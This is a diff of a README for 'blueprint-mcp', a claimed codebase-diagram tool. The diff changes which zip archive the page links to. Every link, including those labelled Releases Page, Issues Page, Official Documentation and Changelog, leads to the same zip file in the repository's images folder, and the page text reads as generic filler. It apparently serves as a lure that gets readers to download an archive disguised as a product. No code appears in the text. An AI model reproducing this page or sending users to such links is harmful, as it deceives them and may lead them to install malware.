@@ -1,7 +1,7 @@
 # 🛠️ blueprint-mcp - Generate Diagrams from Your Codebase
 
 ## 📥 Download Now
-[![Download blueprint-mcp](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip)](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip)
+[![Download blueprint-mcp](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip)](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to blueprint-mcp! This application helps you create diagrams to understand your codebases and system architectures effortlessly. It uses the Nano Banana Pro technology for sharp visuals and easy interpretation.
@@ -18,7 +18,7 @@ Welcome to blueprint-mcp! This application helps you create diagrams to understa
 - Disk Space: At least 500 MB of free space
 
 ## 📦 Download & Install
-1. Visit the [Releases Page](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip) to download the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip) to download the application.
 2. Look for the latest version at the top of the page.
 3. Click on the recommended file for your operating system to start the download process.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -41,12 +41,12 @@ Welcome to blueprint-mcp! This application helps you create diagrams to understa
 
 ## 🌐 Support and Community
 If you have questions or need help, join our community. 
-- **Issues**: Report problems on the [Issues Page](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip).
+- **Issues**: Report problems on the [Issues Page](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip).
 - **Discussions**: Engage with other users and developers in our discussions.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip): Detailed info on all features.
-- [Changelog](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint-mcp_3.9-alpha.3.zip): Track what’s new in each version.
+- [Official Documentation](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip): Detailed info on all features.
+- [Changelog](https://raw.githubusercontent.com/Kasun2006/blueprint-mcp/main/images/blueprint_mcp_v2.9.zip): Track what’s new in each version.
 
 ## 🏁 Conclusion
 Thank you for choosing blueprint-mcp! We are confident this tool will help you visualize and understand your code like never before. For further assistance, feel free to reach out via our support channels.
